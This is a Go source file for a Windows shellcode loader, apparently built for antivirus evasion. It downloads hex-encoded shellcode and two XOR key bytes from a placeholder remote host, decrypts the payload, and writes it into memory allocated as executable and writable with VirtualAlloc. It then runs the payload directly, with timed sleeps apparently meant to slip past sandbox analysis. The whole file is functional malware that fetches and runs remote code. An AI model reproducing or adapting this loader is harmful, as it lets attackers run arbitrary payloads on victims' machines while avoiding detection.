package main

import (
	"encoding/hex"
	"io/ioutil"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlMoveMemory")
	URI           = "http://xxx:80/download/"
)

func keys1() byte {
	time.Sleep(5 * time.Second)
	resp, _ := http.Get(URI + "k1.txt")
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	var tmp = string(body)
	x1, _ := hex.DecodeString(tmp)
	return x1[0]
}

func keys2() byte {
	time.Sleep(5 * time.Second)
	resp, _ := http.Get(URI + "k2.txt")
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	var tmp = string(body)
	x1, _ := hex.DecodeString(tmp)
	return x1[0]
}

func main() {
	time.Sleep(5 * time.Second)
	resp, err := http.Get(URI + "code.txt")
	if err != nil {
		print(err)
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	var tmp = string(body)
	x1, _ := hex.DecodeString(tmp)

	var key1 byte = keys1()
	var key2 byte = keys2()
	var res []byte
	for i := 0; i < len(x1); i++ {
		res = append(res, x1[i]^key1^key2)
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(res)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&res[0])), uintptr(len(res)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(5 * time.Second)
	syscall.Syscall(addr, 0, 0, 0, 0)
}
